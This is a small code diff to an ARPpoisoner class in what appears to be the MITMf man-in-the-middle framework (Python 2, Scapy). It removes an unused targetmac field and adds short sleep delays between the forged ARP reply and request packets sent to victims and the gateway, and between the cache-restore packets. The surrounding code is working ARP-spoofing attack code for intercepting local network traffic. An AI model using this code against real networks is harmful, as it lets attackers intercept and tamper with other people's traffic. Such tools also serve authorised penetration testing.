@@ -14,7 +14,6 @@ class ARPpoisoner():
         self.gatewaymac = getmacbyip(gateway)
         self.mymac      = mac
         self.targets    = self.getTargetRange(targets)
-        self.targetmac  = None
         self.interface  = interface
         self.arpmode    = 'rep'
         self.debug      = False
@@ -48,7 +47,6 @@ class ARPpoisoner():
         mitmf_logger.debug("[ARPpoisoner] gatewayip  => {}".format(self.gatewayip))
         mitmf_logger.debug("[ARPpoisoner] gatewaymac => {}".format(self.gatewaymac))
         mitmf_logger.debug("[ARPpoisoner] targets    => {}".format(self.targets))
-        mitmf_logger.debug("[ARPpoisoner] targetmac  => {}".format(self.targetmac))
         mitmf_logger.debug("[ARPpoisoner] mymac      => {}".format(self.mymac))
         mitmf_logger.debug("[ARPpoisoner] interface  => {}".format(self.interface))
         mitmf_logger.debug("[ARPpoisoner] arpmode    => {}".format(self.arpmode))
@@ -92,6 +90,7 @@ class ARPpoisoner():
 
                         elif targetmac:
                             send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="is-at"), iface=self.interface, verbose=self.debug)
+                            sleep(0.3)
                             send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="is-at", ), iface=self.interface, verbose=self.debug)
 
                     except Exception, e:
@@ -117,6 +116,7 @@ class ARPpoisoner():
 
                         elif targetmac:
                             send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op="who-has"), iface=self.interface, verbose=self.debug)
+                            sleep(0.3)
                             send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op="who-has"), iface=self.interface, verbose=self.debug)
 
                     except Exception, e:
@@ -142,6 +142,7 @@ class ARPpoisoner():
                     mitmf_logger.info("[ARPpoisoner] Restoring connection {} <-> {} with {} packets per host".format(targetip, self.gatewayip, count))
 
                     send(ARP(op="is-at", pdst=self.gatewayip, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetmac), iface=self.interface, count=count, verbose=self.debug)
+                    sleep(0.3)
                     send(ARP(op="is-at", pdst=targetip, psrc=self.gatewayip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), iface=self.interface, count=count, verbose=self.debug)
 
             except Exception, e:
